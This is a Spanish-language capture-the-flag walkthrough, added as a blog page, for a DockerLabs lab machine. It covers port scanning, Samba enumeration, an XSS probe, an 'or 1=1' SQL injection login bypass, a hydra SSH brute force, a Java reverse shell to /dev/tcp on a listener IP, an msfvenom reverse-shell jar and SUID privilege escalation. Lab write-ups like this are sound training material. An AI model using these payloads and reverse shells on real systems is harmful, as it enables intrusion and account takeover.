@@ -1,0 +1,128 @@
+<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a> nos encontramos con el tipico escaneo de puertos , enumeracion de samba , sql injection , movimiento lateral entre usuarios y escalada final.</p>
+
+<h2 id="herramientas-y-recursos">Herramientas y recursos</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>enum4linux</li>
+  <li><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/">Exploit notes</a></li>
+</ul>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Lanzamos nmap con los parametros de costumbre en un ctf.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>_nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oX</span> database 172.17.0.2
+</code></pre></div></div>
+
+<p><a href="/reporte/database.html">reporte</a></p>
+
+<p>Observamos que tenemos el 22 el 80 y tanto el 139 como el 445 que coresponden al protocolo samba.</p>
+
+<p>Mientras continumamos con la enumeracion haciendo uso de enum4linux para ver que podriamos tener en samba reviasamos la web.</p>
+
+<p><img src="assets/database/web.png" alt="weblogin" /></p>
+
+<p>Nos muestra un panel de login aqui podriamos probar varias cosas desde xss , sqlinjection , csp ,…. ,  si nos fijamos en el codigo no hay nada que de seguridad ni sanitizacion en la web.</p>
+
+<blockquote>
+  <p>Yo en este punto perdi mucho tiempò tratando de abusar del csp intentando leer el /etc/passwd , sin exito obvio .</p>
+</blockquote>
+
+<p><img src="assets/database/csp.png" alt="csp" /></p>
+
+<p>En la siguente imagen podemos ver que es susceptible a la inyeccion.</p>
+
+<p>Ejecuto:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"/&gt;'&gt;&lt;script src=data:text/javascript,alert(1234)&gt;&lt;/script&gt;
+</span></code></pre></div></div>
+
+<p>Da error</p>
+
+<p><img src="assets/database/sqlinerror.png" alt="sqlinerror" /></p>
+
+<p>Pero lo traga
+ <img src="assets/database/alert.png" alt="alert" />
+ Ahora deberíamos probar a hacer login .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'or 1=1-- -
+</span></code></pre></div></div>
+
+<p><img src="assets/database/dylanlogin.png" alt="dylan" /></p>
+
+<p>Conseguimos loguearnos pero a simple vista y en mi opinion esto es un agujero para perder tiempo “imagino deben haber payloads de sql inyection que nos muestren los usuarios y las passwords lo ignoro por ahora”</p>
+
+<p>Veamos ahora que hemos conseguido con enum4linux.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux <span class="nt">-a</span> 172.17.0.2
+</code></pre></div></div>
+
+<p>Esta vez tenemos mas suerte y encontramos usuarios con lo cual ya podriamos probrar con hydra hacia ssh.</p>
+
+<p><img src="assets/database/users.png" alt="users" /></p>
+
+<p>Para ello me creo un fichero con los nombres de los usuarios para pasarselo a hydra .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> usuarios <span class="nt">-P</span> /home/quino/Descargas/rockyou/rockyou.txt ssh://172.17.0.2 <span class="nt">-t</span> 4
+</code></pre></div></div>
+
+<p><img src="assets/database/hydra.png" alt="hydra" /></p>
+
+<h2 id="infiltracion">Infiltracion</h2>
+
+<p>Hydra nos a conseguido la pass del usuario augustus , como  le pasamos la lista con los nombres de usuarios yo lo dejo trabajando por si me saca la de dylan o la de bob , mas que nada por si augusto es otra madriguera de conejo como e  login web.</p>
+
+<p>Vamos a logearnos y salimos de dudas.
+Yo siempre busco con sudo -l .</p>
+
+<p><img src="assets/database/sudoau.png" alt="sudoau" /></p>
+
+<p>Tenemos java para poder realizar movimiento lateral hacia dylan , ahora si que detengo el hydra que estaba corriendo.</p>
+
+<p>Intento con una revshell crada a traves de revshells.com y en este caso el codigo no funciono.</p>
+
+<p>Codigo que no funciono en esta , pero si andubo en la pinguinazo.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">shell</span> <span class="o">{</span>
+	<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+	         <span class="nc">Process</span> <span class="n">p</span><span class="o">;</span>         
+	         <span class="k">try</span> <span class="o">{</span>             
+		<span class="n">p</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1"</span><span class="o">);</span>  <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>             
+<span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span>         
+       <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>     
+	<span class="o">}</span> 
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Buscando en internet encuentro el suguiente enlace <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/" title="abuso java">java exploit</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;local-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> jar <span class="nt">-o</span> shell.jar
+</code></pre></div></div>
+
+<p>Ahora reviso el fichero creado y me queda claro que la diferencia salta a la vista , no me andaba porque le pasaba un script y estaba esperando un binario.
+Nos lo transferimos con python creando un server http y una vez lo tenemos ejecutamos para convertirnos en dylan.</p>
+
+<p><img src="assets/database/pyserver.png" alt="server" /></p>
+
+<p>Nos ponemos en escuha como siempre antes de ejecutar la revshell.
+Una vez recibida la conexion realizamos tratamiento de la tty.
+Empezamos con sudo para ver si pasamos a bob o a root directos.</p>
+
+<p>En esta ocasion sudo no nos aporta nada pero con find tenemos suerte y encontranos el binario env con suid y podemos realizar la escalada final.</p>
+
+<h2 id="escalada-final">Escalada final</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="assets/database/searchbins.png" alt="searchbins" /></p>
+
+<p>Ejecutamos como nos indica y somos root.</p>
+
+<p><img src="assets/database/root.png" alt="root" /></p>
+
+<p>Hasta aqui la maquina.</p>
+
+<p>Muchas gracias por leer ..</p>
+
